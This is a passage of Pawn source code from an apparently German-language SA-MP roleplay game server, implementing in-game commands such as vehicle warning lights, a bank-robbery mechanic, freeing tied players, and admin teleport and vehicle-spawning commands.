						light2[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19154,-0.0089111328, 0.273193359, 1.4037838, 0.0, 0.0, 96.0);
						light3[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19154,-0.0089111328, 0.273193359, 1.4037838, 0.0, 0.0, 96.0);
						light4[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19154,-0.0089111328, 0.273193359, 1.4037838, 0.0, 0.0, 96.0);
						light5[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19154,-0.0089111328, 0.273193359, 1.4037838, 0.0, 0.0, 96.0);
						AttachDynamicObjectToVehicle(light1[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.0089111328, -0.5, 1.55, 0.0, 0.0, 0.0);
						AttachDynamicObjectToVehicle(light2[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.5, -0.5, 1.55, 0.0, 0.0, 0.0);
						AttachDynamicObjectToVehicle(light3[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.5, -0.5, 1.55, 0.0, 0.0, 0.0);
						AttachDynamicObjectToVehicle(light4[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.5, 2.75, 0.6, 0.0, 0.0, 0.0);
						AttachDynamicObjectToVehicle(light5[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.5, 2.75, 0.6, 0.0, 0.0, 0.0);
						GameTextForPlayer(playerid,"~r~Warnlicht Aktiviert",5000, 1);
						SendClientMessage(playerid, COLOR_GREY, "Du kannst das Warnlicht mit /olicht wieder ausschalten!");
                                                Olicht[GetPlayerVehicleID(playerid)] = 1;
					}
					else if(Olicht[GetPlayerVehicleID(playerid)] == 1)
					{
						DestroyDynamicObject(light1[GetPlayerVehicleID(playerid)]);
						DestroyDynamicObject(light2[GetPlayerVehicleID(playerid)]);
						DestroyDynamicObject(light3[GetPlayerVehicleID(playerid)]);
						DestroyDynamicObject(light4[GetPlayerVehicleID(playerid)]);
						DestroyDynamicObject(light5[GetPlayerVehicleID(playerid)]);
						GameTextForPlayer(playerid,"~r~Warnlicht Deaktiviert",5000, 1);
						SendClientMessage(playerid, COLOR_GREY, "Du kannst das Warnlicht mit /olicht wieder anschalten!");
						Olicht[GetPlayerVehicleID(playerid)] = 0;
					}
				}
			}
			return 1;
	}
    if(strcmp(cmd, "/freefromcar", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(IsPlayerInFrac(playerid, 21))
			{
                new vehicleid = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(vehicleid) == 560)//
				{

				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GREY, "Befehl: /freefromcar [playerid] [Sitz: 0 = hinten links, 1 = hinten rechts]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				//if(!IsAWheelman(giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Dieser Spieler ist kein Gang-mitglied.");
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != playerid)
					{
		     			tmp = strtoknew(cmdtext, idx);
		     			if(!strlen(tmp))
		    			{
		      				SendClientMessage(playerid, COLOR_GREY, "Befehl: /freefromcar [playerid] [Sitz: 0 = hinten links, 1 = hinten rechts]");
		      				return 1;
		    			}
		     			new sit = strval(tmp);
		     			if(sit < 0 || sit > 1)
				 		{
							SendClientMessage(playerid, COLOR_GREY, "Wähle den Sitzplatz nicht unter 0 oder über 1!");
							return 1;
				 		}
						if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER )
						{
							SendClientMessage(playerid, COLOR_GREY, "Du bist nicht der Fahrer dieses Fahrzeuges!");
							return 1;
				 		}
						if(GetDistanceBetweenPlayers(playerid, giveplayerid) < 10)
						{
						    new member = 0;
							for(new i = 0; i<MAX_PLAYERS; i++)
							{
								if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] || PlayerInfo[i][pLeader] == PlayerInfo[playerid][pMember]
								|| PlayerInfo[i][pLeader] == PlayerInfo[playerid][pLeader])
								{
									if(GetPlayerState(i) == PLAYER_STATE_DRIVER || GetPlayerState(i) == PLAYER_STATE_PASSENGER)
									{
									    member ++;
	    							}
  								}
							}
	    					if(member >= 2)
	    					{
								if(GetDistanceBetweenPlayers(playerid, giveplayerid) < 10)
								{
								    if(IsPlayerInAnyVehicle(giveplayerid))
								    {
									new car = GetPlayerVehicleID(playerid);
									if(sit == 0)
									{
									    RemovePlayerFromVehicle(giveplayerid);
										new Float:X,Float:Y,Float:Z;
										GetPlayerPos(giveplayerid,X,Y,Z);
										SetPlayerPos(giveplayerid,X,Y,Z+5);
									    format(string,sizeof(string),"* Du hast %s erfolgreich auf dem Sitzplatz 0 gezogen !",giveplayer);
									    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
										PutPlayerInVehicle(giveplayerid, car, 2);
										format(string, sizeof(string), "** Wheelman %s hat %s in sein Fahrzeug gezogen.", sendername,giveplayer);
										ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
										UnFreezePlayer(giveplayerid);
										PlayerTied[giveplayerid] = 0;
									}
									else if(sit == 1)
									{
									    RemovePlayerFromVehicle(giveplayerid);
										new Float:X,Float:Y,Float:Z;
										GetPlayerPos(giveplayerid,X,Y,Z);
										SetPlayerPos(giveplayerid,X,Y,Z+5);
									    format(string,sizeof(string),"* Du hast %s erfolgreich auf dem Sitzplatz 1 gezogen !",giveplayer);
									    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
										PutPlayerInVehicle(giveplayerid, car, 3);
										UnFreezePlayer(giveplayerid);
										PlayerTied[giveplayerid] = 0;
										format(string, sizeof(string), "** Wheelman %s hat %s in sein Fahrzeug gezogen.", sendername,giveplayer);
										ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		       						}
		       					//	format(string, sizeof(string), "ACHTUNG: %s wurde von %s gekidnapped.",giveplayer,sendername);
									for(new g=0;g<MAX_PLAYERS; g++)
									{
									    if(IsPlayerInFrac(playerid, 21))
									    {
									       // SendClientMessage(g, COLOR_GRAD2, string);
					        			}
		        						}
		        					}
		       					}
			      			}
			     		}
                       else{SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht im Sultan!");}}
		    		}
				}
			}
		}
		return 1;
	}

  	if(strcmp(cmd, "/freilassen", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsPlayerInFrac(playerid, 21))
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "FEHLER: /freilassen [Playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber befreien!"); return 1; }
							if(PlayerTied[giveplayerid] || PlayerCuffed[giveplayerid])
							{
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du wurdest von Wheelman %s befreit.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s befreit.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(giveplayerid, "~g~Frei", 2500, 3);
//								format(string, sizeof(string), "Wheelman %s hat die Handschellen von %s gelöst", GetPlayerName(playerid),GetPlayerName(giveplayerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								UnFreezePlayer(giveplayerid);
								PlayerTied[giveplayerid] = 0;
								PlayerCuffed[giveplayerid] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist nicht gefesselt !");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner nähe !");
						    return 1;
						}
					}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
				}
				else
				{
					SendClientMessage(playerid, COLOR_RED, "   Nutze die Maske nicht aus, sonst wird sie entfernt !");
					return 1;
			}
		}//not connected
	}
		return 1;
	}
	if(strcmp(cmd, "/bankrob", true) == 0 || strcmp(cmd, "/ausrauben", true) == 0)
	{
	    if(IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Als Cop kann man keine Bank ausrauben!.");
	    if(!IsPlayerInRangeOfPoint(playerid,8.0,1424.3680,-1003.3315,1639.7843))
	    {
	        SendClientMessage(playerid,0xAA3333AA,"Du bist nicht in der Bank!");
	        return 1;
	    }
    	new Cops = 0;
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
		        if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 3 || PlayerInfo[i][pMember] == 3)
		        {
		            Cops += 3;
		        }
		    }
		}
		if(Cops < 9)
		{
	        SendClientMessage(playerid, COLOR_GREY, "Es müssen mindestens 3 Cops online sein!");
	        return 1;
		}
		if(GetPlayerVirtualWorld(playerid) == 2)
		{//LS
        	if(robls == 1)
        	{
			SendClientMessage(playerid,0xAA3333AA,"Die Bank wurde gerade erst überfallen!");// Spam wenn alle 3 Überfallen sind
			return 1;
	    	}
	    }
		if(GetPlayerVirtualWorld(playerid) == 3)
		{//sf
        	if(robsf == 1)
        	{
	  		SendClientMessage(playerid,0xAA3333AA,"Die Bank wurde gerade erst überfallen!");
			return 1;
	    	}
	    }
		if(GetPlayerVirtualWorld(playerid) == 4)
		{//lv
        	if(roblv == 1)
        	{
			SendClientMessage(playerid,0xAA3333AA,"Die Bank wurde gerade erst überfallen!");
			return 1;
	    	}
	    }
		if(GetPlayerVirtualWorld(playerid) == 2)
		{//LS
		robls = 1;
		SetTimer("Rob_Resetls",1000*60*60,0); // Nach 60 Minuten erst wieder ausrauben
	    }
		if(GetPlayerVirtualWorld(playerid) == 3)
		{//SF
		robsf = 1;
		SetTimer("Rob_Resetsf",1000*60*60,0); // Nach 60 Minuten erst wieder ausrauben
	    }
		if(GetPlayerVirtualWorld(playerid) == 4)
		{//LV
		roblv = 1;
		SetTimer("Rob_Resetlv",1000*60*60,0); // Nach 60 Minuten erst wieder ausrauben
	    }
		SetTimerEx("Rob_UnFreeze",120000,0,"i",playerid); // Nach 2 minuten Bank überfallen
		PlayerInfo[playerid][pBankrob] = 1;
		WantedLevel[playerid] += 7;
		SetPlayerCriminal(playerid,255, "Bankraub");
		SendClientMessage(playerid,0xFF9933FF,"Du willst die Bank überfallen und musst warten bis das Geld eingepackt ist!");
		SendClientMessage(playerid,0xFF9933FF,"Verlasse vorher nicht die Bank!");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
			    if(IsACop(i))
			    {
					SendClientMessage(i,COLOR_RED,"HQ: Achtung Alle Einheiten! Eine Meldung vom Bank Security System!");
					SendClientMessage(i,COLOR_RED,"HQ: Verbrechen: Banküberfall, Gesuchter: Unbekannt");
	            	if(GetPlayerVirtualWorld(playerid) == 2)
	            	{//LS
					SendClientMessage(i,COLOR_RED,"HQ: Begeben sie sich sofort zur Folgender Bank: Los Santos");
	                }
                	if(GetPlayerVirtualWorld(playerid) == 3)
	            	{//SF
					SendClientMessage(i,COLOR_RED,"HQ: Begeben sie sich sofort zur Folgender Bank: San Fierro");
	                }
	            	if(GetPlayerVirtualWorld(playerid) == 4)
	            	{//LV
					SendClientMessage(i,COLOR_RED,"HQ: Begeben sie sich sofort zur Folgender Bank: Las Venturas");
	                }
				}
			}
		}
		return 1;
	}
   //=====================================================================
	if(strcmp(cmd, "/gotols", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1529.6725,-1673.1500,12.9887);
					LinkVehicleToInterior(tmpcar,0);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			        SetPlayerVirtualWorld(playerid, 0);
		         	SetPlayerInterior(playerid, 0);
				}
				else
				{
					SetPlayerPos(playerid, 1529.6725,-1673.1500,12.9887);
			        SetPlayerVirtualWorld(playerid, 0);
		            SetPlayerInterior(playerid, 0);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "Du hast dich nach Los Santos geportet.");
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
			}
			else
   			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotolv", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1699.2, 1435.1, 10.7);
					LinkVehicleToInterior(tmpcar,0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid, 1699.2,1435.1, 10.7);
				}
			 	SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich nach Las Venturas geportet.");
		    	SetPlayerVirtualWorld(playerid, 0);
		    	SetPlayerInterior(playerid, 0);
				PlayerInfo[playerid][pInt] = 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotosf", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
					SetVehiclePos(tmpcar, -1417.0,-295.8,14.1);
					LinkVehicleToInterior(tmpcar,0);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid, -1417.0,-295.8,14.1);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich nach San Fierro geportet.");
				GetPlayerName(playerid, sendername, sizeof(sendername));
		       	SetPlayerVirtualWorld(playerid, 0);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/gotobsn", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar,1212.9077,-884.9197,42.9153);
					SetVehicleZAngle(tmpcar,173.6692);
					LinkVehicleToInterior(tmpcar,0);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid,1212.9077,-884.9197,42.9153);
					SetPlayerFacingAngle(playerid,173.6692);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich zum Burger Shot North geportet.");
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(PlayerInfo[playerid][pAdmin] >= 2000) { }
				else {
					format(string, sizeof(string), "%s hat sich zum BSN geportet.", sendername);
					ABroadCast(0x00F5FFFF,string,4);
				}
		    	SetPlayerVirtualWorld(playerid, 0);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/entercar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /entercar [carid]");
				return 1;
			}
			new testcar = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				PutPlayerInVehicle(playerid, testcar, 1);
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich Teleportiert [Nutze es nicht aus, es wird in der Log. Angezeigt!]");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotocar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /gotocar [carid]");
				return 1;
			}
			new testcar = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				new Float:cwx2,Float:cwy2,Float:cwz2;
				GetVehiclePos(testcar, cwx2, cwy2, cwz2);
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, cwx2, cwy2, cwz2);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid, cwx2, cwy2, cwz2);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich Teleportiert [Nutze es nicht aus, es wird in der Log. Angezeigt!]");
				SetPlayerInterior(playerid,0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/mark", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
				SendClientMessage(playerid, COLOR_GRAD1, "   Teleporter Zielort gesetzt");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotoin", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1416.107000,0.268620,1000.926000);
				}
				else
				{
					SetPlayerPos(playerid, 1416.107000,0.268620,1000.926000);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich Teleportiert [Nutze es nicht aus, es wird in der Log. Angezeigt!]");
				SetPlayerInterior(playerid,1);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotostad", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, -1435.75, -652.664, 1054.94);
				}
				else
				{
					SetPlayerPos(playerid, -1435.75, -652.664, 1054.94);
				}
				SetPlayerInterior(playerid,4);
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich Teleportiert [Nutze es nicht aus, es wird in der Log. Angezeigt!]");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gotojet", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1.71875, 30.4062, 1200.34);
				}
				else
				{
					SetPlayerPos(playerid, 1.71875, 30.4062, 1200.34);
				}
				SetPlayerInterior(playerid,1);
				SendClientMessage(playerid, COLOR_GRAD1, "   Du hast dich Teleportiert [Nutze es nicht aus, es wird in der Log. Angezeigt!]");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt");
			}
		}
		return 1;
	}

if(strcmp(cmd, "/goto", true) == 0)
{
    if(!IsPlayerConnected(playerid))return 1;
	tmp = strtoknew(cmdtext, idx);
	if(!strlen(tmp))return SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /goto [playerid/PartOfName]");
	new Float:Pos[3],VirtualWorld,Interior,pID;
	pID = ReturnUser(tmp);
	if(!IsPlayerConnected(pID))return SendClientMessage(playerid,-1,"Der Spieler ist nicht online!");
    if(pID == INVALID_PLAYER_ID)return 1;
	if(PlayerInfo[playerid][pAdmin] >= 4 || PlayerInfo[playerid][pSupporter] >= 4)
	{
		if(Spectate[playerid] != 255)Spectate[playerid] = 256;
		GetPlayerPos(pID, Pos[0], Pos[1], Pos[2]);
		VirtualWorld = GetPlayerVirtualWorld(pID);
		Interior = GetPlayerInterior(pID);
		if(GetPlayerState(playerid) == 2){
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, Pos[0], Pos[1] + 4.0, Pos[2]);
			SetVehicleVirtualWorld(tmpcar,VirtualWorld);
			LinkVehicleToInterior(tmpcar, Interior);
			TelePos[playerid][0] = 0.0;
			TelePos[playerid][1] = 0.0;
		}else{
			SetPlayerPos(playerid,Pos[0], Pos[1] + 2.0, Pos[2]);
			SetPlayerInterior(playerid,Interior);
			SetPlayerVirtualWorld(playerid,VirtualWorld);
		}
		PlayerInfo[playerid][pLocal] = PlayerInfo[pID][pLocal];
		PlayerInfo[playerid][pInt] = PlayerInfo[pID][pInt];
        new name[MAX_PLAYER_NAME+1];
        GetPlayerName(pID, name, sizeof(name));
        format(string, sizeof(string), "* Du hast dich zu %s teleportiert.", name);
        SendClientMessage(playerid, COLOR_RED, string);
        GetPlayerName(playerid, name, sizeof(name));
        format(string, sizeof(string), "* Admin %s hat sich zu dir teleportiert.", name);
        SendClientMessage(pID, COLOR_RED, string);
	}
	else return SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
return 1;
}






/*

	if(strcmp(cmd, "/payday", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 2000)
	        {
         		tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "BENUTZUNG: /payday [playerid/Name] (Gibt dem Spieler einen PayDay");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						format(string, sizeof(string), "* Du hast Spieler %s einen PayDay gegeben. *",giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Admin %s hat dir einen PayDay gegeben.",sendername);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						new admwarnung[126];
						new iyear, imonth,iday;
						getdate(iyear, imonth, iday);
						format(admwarnung, sizeof(admwarnung), "AdmCmd: %s hat %s einen PayDay gegeben (%d.%d.%d)", sendername, giveplayer,iday,imonth,iyear);
						ABroadCast(COLOR_LIGHTRED, admwarnung, 1);
						PlayerInfo[giveplayerid][pPlayerKreditDauer] = 59;
						SendClientMessage(playerid,COLOR_GREY,"Achtung nutze diesen Befehl nicht zu oft aus!");
						return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "Du bist nicht berechtigt, diesen Befehl zu benutzen !");
			    return 1;
   			}
		}
		return 1;
	}
*/
//----------------------------------[GETHERE]-----------------------------------------------
	if(strcmp(cmd, "/gethere", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /gethere [Spieler ID]");
				return 1;
			}
			new Float:plocx,Float:plocy,Float:plocz;
			new plo;
			plo = ReturnUser(tmp);
			if (IsPlayerConnected(plo))
			{
			    if(plo != INVALID_PLAYER_ID)
			    {
					if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 2)
					{
						GetPlayerPos(playerid, plocx, plocy, plocz);
						if (GetPlayerState(plo) == 2)
						{
							TelePos[plo][0] = 0.0;
							TelePos[plo][1] = 0.0;
							new tmpcar = GetPlayerVehicleID(plo);
							SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
						}
						else
						{
							SetPlayerPos(plo,plocx,plocy+2, plocz);
						}
						PlayerInfo[plo][pLocal] = PlayerInfo[playerid][pLocal];
						PlayerInfo[plo][pInt] = PlayerInfo[playerid][pInt];
						SetPlayerInterior(plo,GetPlayerInterior(playerid));
						SetPlayerVirtualWorld(plo,GetPlayerVirtualWorld(playerid));
						GetPlayerName(plo, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "* Admin %s hat dich zu sich teleportiert.", sendername);
                        SendClientMessage(plo, COLOR_RED, string);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
					}
				}
			}
			else
			{
				format(string, sizeof(string), "%d ist kein Aktiver Spieler.", plo);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/oldcar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    format(string, sizeof(string), "Dein Altes Auto war: %d",gLastCar[playerid]);
		    SendClientMessage(playerid, COLOR_GREY, string);
	    }
	    return 1;
	}


//----------------------------------[setskin]------------------------------------------------
	if(strcmp(cmd, "/setskin", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Hilfe : /setskin [playerid/PartOfName] [skin model]");
				return 1;
			}
			new playa;
			new health;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			health = strvalEx(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            new name[20];
						new victim[20];
						GetPlayerName(playerid, name, sizeof(name));
						GetPlayerName(playa, victim, sizeof(victim));
						PlayerInfo[playa][pModel] = health;
						PlayerInfo[playa][pChar] = health;
						SetPlayerSkin(playa, PlayerInfo[playa][pChar]);
//						format(string, 256, "AdmWarning: [%s] Skin was just set to %d by %s!",victim,health,name);
//						ABroadCast(COLOR_YELLOW,string,1347);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin!");
			}
		}
		return 1;
	}
   	if(strcmp(cmd, "/veh", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if (PlayerInfo[playerid][pAdmin] < 1338)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin!");
			    return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /veh [carid] [color1] [color2]");
				return 1;
			}
			new car;
			car = strval(tmp);
			if(car < 400 || car > 611) { SendClientMessage(playerid, COLOR_GREY, "Auto Nummer nicht weniger als 400 oder höher als 611 sein !"); return 1; }
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /veh [carid] [color1] [color2]");
				return 1;
			}
			new color1;
			color1 = strval(tmp);
			if(color1 < 0 || color1 > 252) { SendClientMessage(playerid, COLOR_GREY, "Nicht Weniger als 0 oder höher 252 !"); return 1; }
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /veh [carid] [color1] [color2]");
				return 1;
			}
			new color2;
			color2 = strval(tmp);
			if(color2 < 0 || color2 > 252) { SendClientMessage(playerid, COLOR_GREY, "Nicht weniger als 0 oder höher als 252!"); return 1; }
			new Float:X,Float:Y,Float:Z,Float:fA;
			GetPlayerPos(playerid, X,Y,Z);
			GetPlayerFacingAngle(playerid,fA);
			new carid = CreateVehicle(car, X,Y,Z, fA, color1, color2, -1, 0);
			SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
			SetVehicleNumberPlate(carid, "Eventcar");
			CreatedCars[CreatedCar] = carid;
			CreatedCar++;
			Gas[carid] = GetGasMax(car);
			format(string, sizeof(string), "Auto mit der ID %d hergestellt.", carid);
			SendClientMessage(playerid, COLOR_GREY, string);
			SetVehicleToRespawn(carid);
			PutPlayerInVehicle(playerid,carid,0);

		}
		return 1;
	}
	if(strcmp(cmd, "/deletethiscar", true) == 0 || strcmp(cmd, "/dtc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {

